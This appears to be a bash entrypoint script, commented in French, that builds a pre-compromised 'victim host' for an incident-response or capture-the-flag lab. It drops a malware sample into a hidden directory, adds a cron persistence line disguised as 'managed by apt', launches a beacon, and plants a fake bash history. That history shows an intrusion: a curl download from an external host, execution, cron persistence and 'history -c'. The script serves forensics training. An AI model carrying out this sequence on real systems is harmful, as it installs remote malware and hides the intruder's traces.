#!/bin/bash
# victim-host : hote DEJA compromis. Au demarrage, on rejoue l'etat post-intrusion
# a partir des IOC de session (deterministes depuis FLAG_SUFFIX) : binaire
# malveillant depose, balise C2 active, persistance cron, historique revelateur.
set -u
sh /usr/local/bin/iocgen.sh
. /opt/incident/state

# 1) binaire malveillant depose dans un dossier cache
mkdir -p "$MAL_DIR"
cp /opt/malware_sample "$MAL_BIN"
chmod +x "$MAL_BIN"

# 2) persistance : tache cron (IOC a decouvrir ; pas de daemon cron actif)
printf '# managed by apt\n*/15 * * * * root %s >/dev/null 2>&1\n' "$MAL_BIN" > "$CRON_FILE"

# 3) historique bash revelateur (trace laissee par l'intrus)
cat > /root/.bash_history <<EOF
id
uname -a
mkdir -p $MAL_DIR
curl -s http://$EXT_IP/x/agent -o $MAL_BIN
chmod +x $MAL_BIN
$MAL_BIN &
echo '*/15 * * * * root $MAL_BIN' > $CRON_FILE
history -c
EOF
chmod 600 /root/.bash_history

# 4) lance la balise (unique instance) — ps montrera .../$PROC, connexion vers siem:$C2_PORT
"$MAL_BIN" &

exec ttyd -p 7681 -W bash
